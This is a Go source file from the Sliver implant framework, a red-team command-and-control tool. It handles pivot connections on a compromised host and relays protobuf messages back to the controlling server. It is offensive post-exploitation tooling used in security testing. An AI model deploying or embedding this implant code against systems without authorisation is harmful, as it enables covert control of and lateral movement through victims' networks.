package pivots

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}
	"bytes"
	"encoding/binary"
	"net"
	"sync"

	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

const (
	readBufSize  = 1024
	writeBufSize = 1024
)

// pivotsMap - holds the pivots, provides atomic access
var pivotsMap = &PivotsMap{
	Pivots: &map[uint32]*pivotsMapEntry{},
	mutex:  &sync.RWMutex{},
}

var pivotListeners = make([]*PivotListener, 0)

type pivotsMapEntry struct {
	Conn          *net.Conn
	PivotType     string
	RemoteAddress string
	Register      []byte
}

// PivotsMap - struct that defines de pivots, provides atomic access
type PivotsMap struct {
	mutex  *sync.RWMutex
	Pivots *map[uint32]*pivotsMapEntry
}

type PivotListener struct {
	Type          string
	RemoteAddress string
}

func GetListeners() []*PivotListener {
	return pivotListeners
}

// Pivot - Get Pivot by ID
func (p *PivotsMap) Pivot(pivotID uint32) *pivotsMapEntry {
	p.mutex.Lock()
	defer p.mutex.Unlock()
	return (*p.Pivots)[pivotID]
}

// AddPivot - Add a pivot to the map (atomically)
func (p *PivotsMap) AddPivot(pivotID uint32, conn *net.Conn, t, addr string) {
	p.mutex.Lock()
	defer p.mutex.Unlock()
	entry := pivotsMapEntry{
		Conn:          conn,
		PivotType:     t,
		RemoteAddress: addr,
	}
	(*p.Pivots)[pivotID] = &entry
}

// RemovePivot - Add a pivot to the map (atomically)
func (p *PivotsMap) RemovePivot(pivotID uint32) {
	p.mutex.Lock()
	defer p.mutex.Unlock()
	delete((*p.Pivots), pivotID)
}

func Pivot(pivotID uint32) *net.Conn {
	return pivotsMap.Pivot(pivotID).Conn
}

// ReconnectActivePivots - Send a new PivotOpen message back to the server for each alive pivot
func ReconnectActivePivots(connection *transports.Connection) {
	// {{if .Config.Debug}}
	log.Println("Reconnecting active pivots...")
	// {{end}}
	for k, v := range *pivotsMap.Pivots {
		SendPivotOpen(k, (*v).Register, connection)
	}
}

// SendPivotOpen - Sends a PivotOpen message back to the server
func SendPivotOpen(pivotID uint32, registerMsg []byte, connection *transports.Connection) {
	pivotsMap.Pivot(pivotID).Register = registerMsg
	pivot := pivotsMap.Pivot(pivotID)
	pivotOpen := &sliverpb.PivotOpen{
		PivotID:       pivotID,
		PivotType:     pivot.PivotType,
		RemoteAddress: pivot.RemoteAddress,
		RegisterMsg:   registerMsg,
	}
	data, err := proto.Marshal(pivotOpen)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println(err)
		// {{end}}
		return
	}
	// W T F!!!!!
	if connection.IsOpen {
		connection.Send <- &sliverpb.Envelope{
			Type: sliverpb.MsgPivotOpen,
			Data: data,
		}
	} else {
		// {{if .Config.Debug}}
		log.Println("Connection is not open...")
		// {{end}}
	}
}

// SendPivotClose - Sends a PivotClose message back to the server
func SendPivotClose(pivotID uint32, err error, connection *transports.Connection) {
	pivotClose := &sliverpb.PivotClose{
		PivotID: pivotID,
		Err:     err.Error(),
	}
	data, err := proto.Marshal(pivotClose)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println(err)
		// {{end}}
		return
	}
	connection.Send <- &sliverpb.Envelope{
		Type: sliverpb.MsgPivotClose,
		Data: data,
	}
}

// PivotWriteEnvelope - Writes a protobuf envolope to a generic connection
func PivotWriteEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Print("Envelope marshaling error: ", err)
		// {{end}}
		return err
	}
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
	_, err = (*conn).Write(dataLengthBuf.Bytes())
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("pivots.PivotWriteEnvelope error %v and %d\n", err, dataLengthBuf)
		// {{end}}
	}
	totalWritten := 0
	for totalWritten < len(data)-writeBufSize {
		n, err2 := (*conn).Write(data[totalWritten : totalWritten+writeBufSize])
		totalWritten += n
		if err2 != nil {
			// {{if .Config.Debug}}
			log.Printf("pivots.PivotWriteEnvelope error %v\n", err)
			// {{end}}
		}
	}
	if totalWritten < len(data) {
		missing := len(data) - totalWritten
		_, err := (*conn).Write(data[totalWritten : totalWritten+missing])
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("pivots.PivotWriteEnvelope error %v\n", err)
			// {{end}}
		}
	}
	return nil
}

// PivotReadEnvelope - Reads a protobuf envolope from a generic connection
func PivotReadEnvelope(conn *net.Conn) (*sliverpb.Envelope, error) {
	dataLengthBuf := make([]byte, 4)
	_, err := (*conn).Read(dataLengthBuf)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("pivots.PivotReadEnvelope error (read msg-length): %v\n", err)
		// {{end}}
		return nil, err
	}
	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))
	readBuf := make([]byte, readBufSize)
	dataBuf := make([]byte, 0)
	totalRead := 0
	for {
		n, err := (*conn).Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Read error: %s\n", err)
			// {{end}}
			break
		}
	}
	envelope := &sliverpb.Envelope{}
	err = proto.Unmarshal(dataBuf, envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unmarshaling envelope error: %v", err)
		// {{end}}
		return &sliverpb.Envelope{}, err
	}
	return envelope, nil
}
